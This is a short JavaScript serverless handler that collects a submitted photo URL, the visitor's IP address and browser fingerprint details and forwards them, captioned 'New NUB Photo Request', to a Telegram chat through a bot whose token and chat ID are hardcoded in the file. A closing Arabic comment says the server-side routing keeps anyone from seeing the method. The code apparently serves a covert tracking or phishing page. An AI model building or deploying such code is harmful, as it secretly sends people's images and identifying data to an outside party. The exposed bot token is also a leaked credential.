const axios = require('axios');

export async function handler(event, context) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const { nubId, imageUrl, deviceInfo } = JSON.parse(event.body);
    const botToken = "7820292840:AAGmDdz2cTl4knABm0uw3EY-hfTmHzd7hTU";
    const chatId = "7542713209";

    const clientIP = event.headers['client-ip'] || 
                     event.headers['x-forwarded-for'] || 
                     'Unknown';

    const messageText = `
New NUB Photo Request!
NUB ID: ${nubId}
IP: ${clientIP}
User Agent: ${deviceInfo.userAgent || 'Unknown'}
Platform: ${deviceInfo.platform || 'Unknown'}
Screen: ${deviceInfo.screenWidth || 0}x${deviceInfo.screenHeight || 0}
Timezone: ${deviceInfo.timezone || 'Unknown'}
Language: ${deviceInfo.language || 'Unknown'}
    `;

   

    await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      chat_id: chatId,
      photo: imageUrl,
      caption: `NUB ID: ${messageText}`
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };
  } catch (error) {
    console.error('Telegram error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
}  فهمت يعني يظهر الصوره وكل حاجه من خلال السيرفر عشان محدش يشوف الطريقه
